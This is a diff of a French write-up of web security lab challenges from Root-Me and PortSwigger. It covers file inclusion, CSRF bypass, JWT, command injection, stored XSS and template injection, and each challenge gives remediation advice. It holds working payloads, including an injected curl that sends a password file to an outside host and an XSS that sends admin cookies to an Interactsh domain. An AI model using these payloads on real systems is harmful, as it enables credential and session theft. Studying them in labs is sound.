@@ -46,9 +46,11 @@ GET /image?filename=../../../../../../../etc/passwd%00.jpg
 ## 2. PHP-Filters
 
 ### Lien :
+
 https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters
 
 ### Déroulement :
+
 Le site a été codé de manière à inclure le contenu des pages avec la fonction `include` de PHP via un paramètre fourni dans l’URL (par exemple : `?inc=login.php`).  
 La fonction `include` est donc ici utilisée dans le but de lire le fichier spécifié, d’exécuter tout le code PHP qu’il contient et d’afficher uniquement le résultat final.
 
@@ -59,6 +61,7 @@ Ce flux demande à PHP d’ouvrir le fichier ciblé, d’appliquer un encodage B
 Comme le résultat n’est plus un fichier PHP exécutable, `include` ne peut pas l’évaluer et se contente de l’afficher tel quel.
 
 On décode alors cette Base64 afin de retrouver le code original de `login.php`, qui se trouve être :
+
 ```
 <?php
 include("config.php");
@@ -88,6 +91,7 @@ if ( isset($_POST["username"]) && isset($_POST["password"]) ){
 On remarque alors que le fichier `login.php` fait lui-même un include d'un fichier nommé `config.php`. On va donc appliquer le même procédé sur ce fichier afin de lire son contenu.
 
 Le code original de `config.php` s’avère être :
+
 ```
 <?php
 $username="admin";
@@ -97,18 +101,21 @@ $password="DAPt9D2mky0APAF";
 On retrouve donc l'utilisateur ainsi que le mot de passe du compte administrateur.
 
 ### Payload :
+
 ```
 ?inc=php://filter/convert.base64-encode/resource=config.php
 ```
 
 ### Conclusion :
+
 ![screenshot preuve](images/chall2.png)
 ➔ **On a pu se connecter en tant qu'administrateur, ce qui nous permet de valider le challenge.**
 
 ### Pour sécurisé :
-- N’autoriser que des noms de fichiers prédéfinis (whitelist + mapping interne).  
-- Désactiver les wrappers / inclusions via URL : allow_url_include = Off.  
-- Utiliser realpath() + chemins absolus pour éviter toute inclusion hors répertoire autorisé.  
+
+- N’autoriser que des noms de fichiers prédéfinis (whitelist + mapping interne).
+- Désactiver les wrappers / inclusions via URL : allow_url_include = Off.
+- Utiliser realpath() + chemins absolus pour éviter toute inclusion hors répertoire autorisé.
 
 Référence : https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion
 
@@ -122,45 +129,41 @@ https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton
 
 Le but du challenge est d'acceder à la page private qui est seulement disponible pour un utilisateur admin, on a un formulaire profile avec un checkbox status, on suppose que si c'est check on est admin. On a un formulaire contact dont il ne filtre pas les script , alors on peut injecter un script avec le formulaire de changement de profile.
 
-
 ### Payload :
 
-```
-<form name="profileForm" id="profile" action="?action=profile" method="post" enctype="multipart/form-data">
-			<div>
-			<label>Username:</label>
-			<input id="username" type="text" name="username" value="l.mak">
-			</div>
-			<br>		
-			<div>
-			<label>Status:</label>
-			<input id="status" type="checkbox" name="status" checked >
-			</div>
-			<br>
-			<input name="tokeninject" id="token" value="">
-			<button type="submit">Submit</button>
-			</form>
+```html
+<form
+  action="http://challenge01.root-me.org/web-client/ch23/?action=profile"
+  method="post"
+  name="csrf_form"
+  enctype="multipart/form-data"
+>
+  <input id="username" type="text" name="username" value="test" />
+  <input id="status" type="checkbox" name="status" checked />
+  <input id="token" type="hidden" name="token" value="" />
+  <button type="submit">Submit</button>
+</form>
 
 <script>
-const xhr = new XMLHttpRequest();
-xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false); 
-xhr.send(); 
-const response = xhr.responseText;
+  xhttp = new XMLHttpRequest();
+  xhttp.open(
+    "GET",
+    "http://challenge01.root-me.org/web-client/ch23/?action=profile",
+    false
+  );
+  xhttp.send();
+  token_admin = xhttp.responseText.match(/[abcdef0123456789]{32}/);
 
-const token = response.match(/[abcdef0123456789]{32}/g)[0];
-document.querySelector('[name="tokeninject"]').value = token
-document.querySelector('[name="profileForm"]').submit();
+  document.getElementById("token").setAttribute("value", token_admin);
 
-
+  document.csrf_form.submit();
 </script>
-
 ```
-
-
 
 ![screenshot preuve](images/chall3.png "contournement de jeton")
 
 ### Pour sécurisé :
+
 -Validation du Jeton (Côté Serveur)
 -filtrer les formulaire
 
@@ -169,14 +172,17 @@ document.querySelector('[name="profileForm"]').submit();
 ## 4. CRSF where token is not tied to user session
 
 ### Lien :
+
 https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
 
 ### Déroulement :
+
 Le site a été codé de manière à protéger les **actions sensibles** du compte utilisateur (comme le changement d’adresse e-mail) à l’aide d’un `jeton CSRF` transmis dans le formulaire. Ce jeton est inclus dans la page `/my-account?id=` via un input caché sous celui dédié à l’adresse e-mail.  
 Lors du changement d’adresse via le bouton `Update email`, une requête `POST /my-account/change-email` est envoyée et vérifiée par le serveur avant de traiter la **modification demandée**.
 
-Normalement, la vérification `CSRF` permet de s’assurer que :  
-- la requête provient d’un **formulaire légitime**,  
+Normalement, la vérification `CSRF` permet de s’assurer que :
+
+- la requête provient d’un **formulaire légitime**,
 - et que le jeton correspond à la **session** de l’utilisateur connecté.
 
 Afin de vérifier si le deuxième point s’applique bien à ce site, on va dans un premier temps récupérer un jeton `CSRF` avec le premier compte qui nous est fourni (**wiener**) avant de venir le réutiliser dans une requête effectuée par le deuxième compte (**carlos**).
@@ -220,9 +226,12 @@ Maintenant qu’on sait cela, on va faire en sorte d’exploiter cette faille de
 Pour ce faire, on va créer une page très sommaire qui contient un formulaire caché reprenant les champs `email` et `CSRF`, ainsi qu’un script embarqué qui soumet immédiatement celui-ci :
 
 ```html
-<form action="https://0ae800f003870791803a03e7005700eb.web-security-academy.net/my-account/change-email?id=wiener" method="POST">
-  <input type="hidden" name="email" value="attacker@example.com">
-  <input type="hidden" name="csrf" value="rdl4ztPgUO7rXrPWfCuDXeecnwocwaAj">
+<form
+  action="https://0ae800f003870791803a03e7005700eb.web-security-academy.net/my-account/change-email?id=wiener"
+  method="POST"
+>
+  <input type="hidden" name="email" value="attacker@example.com" />
+  <input type="hidden" name="csrf" value="rdl4ztPgUO7rXrPWfCuDXeecnwocwaAj" />
 </form>
 <script>
   document.forms[0].submit();
@@ -232,6 +241,7 @@ Pour ce faire, on va créer une page très sommaire qui contient un formulaire c
 En hébergeant cette page sur l’`exploit server` fourni par le lab et en la faisant charger par le navigateur de la victime (**wiener**) (toujours connectée à son compte) via le bouton `Deliver exploit to victim`, le formulaire est alors automatiquement soumis avec sa session, mais avec le jeton `CSRF` et l'adresse e-mail que l’on a choisis (`attacker@example.com` et `rdl4ztPgUO7rXrPWfCuDXeecnwocwaAj`).
 
 ### Payload :
+
 ```
 <form action="https://0ae800f003870791803a03e7005700eb.web-security-academy.net/my-account/change-email?id=wiener" method="POST">
   <input type="hidden" name="email" value="attacker@example.com">
@@ -243,10 +253,12 @@ En hébergeant cette page sur l’`exploit server` fourni par le lab et en la fa
 ```
 
 ### Conclusion :
+
 ![screenshot preuve](images/chall4.png)
 ➔ **On a pu modifier l’adresse e-mail de la victime sans son consentement, ce qui nous permet de valider le challenge.**
 
 ### Pour sécurisé :
+
 - Lier le jeton CSRF à la session de l’utilisateur.
 - Régénérer un token unique par action sensible.
 - Activer SameSite sur les cookies.
@@ -330,13 +342,13 @@ https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque
 
 Dans l'énoncer, il nous a donné les endpoint POST : /web-serveur/ch63/login, GET : /web-serveur/ch63/admin et le code source du server, on a pu récupérer les information: de l'admin et l'algorime du système de blacklist
 
-
 ### Requête pour se connecter :
 
 ```
 curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}' http://challenge01.root-me.org/web-serveur/ch63/login
 
 ```
+
 ### Retour de la commande :
 
 ```
@@ -500,9 +512,11 @@ ip=127.0.0.1%0Acurl -X POST -d @.passwd bflwwcoiewtvlkzyhkkukrs1vr8bc8y1f.oast.f
 ## 9. XSS vulnerability
 
 ### Lien :
+
 https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2
 
 ### Déroulement :
+
 Le site a été codé de manière à inclure **deux fois** dans le `DOM` un cookie `status` qui permet d'indiquer le status des personnes qui laissent un commentaire sur celui-ci.
 La première utilisation du cookie dans le DOM se fait via l'affichage de la valeur de celui dans une balise `<i>` **mais de manière échappée** (ce qui ne représente pas de faille).
 Cependant, **la deuxième utilisation en tant que nom de classe CSS**, elle, n'est **pas échappée**.
@@ -512,11 +526,15 @@ On construit donc un payload simple qui sera remplacé par ce cookie `status` (i
 
 Cependant, afin de **récupérer le cookie sans l'afficher dans un `alert()`** qui surgirait chez tous les utilisateurs accédant à la page (ce qui serait visible, bruyant et immédiatement suspect), on va plutôt opter pour **Interactsh**, un site permettant de **confirmer discrètement l’exécution du script sur une adresse unique fournie par le service** (en l'occurrence ici `ymidnwwmojcwyvvxoveyqv3bt2jchyygo.oast.fun`), et tout cela **sans rien afficher côté client**.
 
-
 Ainsi, on forme donc un script de ce genre qui remplacera la valeur `invite` du cookie `status` :
 
 ```html
-"><script>document.location.href="https://ymidnwwmojcwyvvxoveyqv3bt2jchyygo.oast.fun/?cookie="+document.cookie</script>
+">
+<script>
+  document.location.href =
+    "https://ymidnwwmojcwyvvxoveyqv3bt2jchyygo.oast.fun/?cookie=" +
+    document.cookie;
+</script>
 ```
 
 Enfin, après un peu d'attente, on observe qu'un admin a consulté les messages et que son cookie de session a bien été loggé sur notre serveur **Interactsh** :
@@ -528,8 +546,9 @@ On peut donc créer un nouveau cookie `ADMIN_COOKIE` avec la valeur `SY2USDIH78T
 ➔ **On a pu récupérer le cookie de session de l'admin et se connecter via celui-ci sans son consentement, ce qui nous permet de valider le challenge.**
 
 ### Pour sécurisé :
+
 - Échapper toutes les données utilisateur avant insertion dans le HTML.
-- Bloquer l’injection dans les attributs HTML sensibles (class, style, on*…).
+- Bloquer l’injection dans les attributs HTML sensibles (class, style, on\*…).
 - Ajouter une politique CSP pour limiter l’exécution de scripts.
 
 Référence : https://owasp.org/www-community/attacks/xss
@@ -542,7 +561,8 @@ Référence : https://owasp.org/www-community/attacks/xss
 
 https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit
 
-La piste était de cliquer sur les produit. lorsqu'on produit n'est pas disponible l'url nous donne url /?message=Unfortunately%20this%20product%20is%20out%20of%20stock. Ici on a une entré vulnérable , on cherche sur payloadallthethings dans la mtehodologie il nous donne ${{<%[%'"}}%\. Grâce à ca on a pu derterminer que le moteur de template etait du handlebar. on cherche sur google Handlebars server-side template injection , on trouve ce script 
+La piste était de cliquer sur les produit. lorsqu'on produit n'est pas disponible l'url nous donne url /?message=Unfortunately%20this%20product%20is%20out%20of%20stock. Ici on a une entré vulnérable , on cherche sur payloadallthethings dans la mtehodologie il nous donne ${{<%[%'"}}%\. Grâce à ca on a pu derterminer que le moteur de template etait du handlebar. on cherche sur google Handlebars server-side template injection , on trouve ce script
+
 ```
 wrtz{{#with "s" as |string|}}
     {{#with "e"}}
@@ -565,11 +585,13 @@ wrtz{{#with "s" as |string|}}
 {{/with}}
 
 ```
-on encode_url le code puis on passe dans l'url 
+
+on encode_url le code puis on passe dans l'url
 
 ![screenshot preuve](images/chall10.png "Server-side template injection")
 
 ### Pour sécurisé :
+
 -Tests de Sécurité (Fuzzing) : Intégrer des tests automatisés qui injectent des chaînes de fuzzing (comme ${{<%[%'"}}%) dans tous les paramètres d'entrée, pour s'assurer qu'aucune erreur de compilation ou d'exécution de template n'est renvoyée.
 -ne pas mettre de message d'erreur dans l'url
 
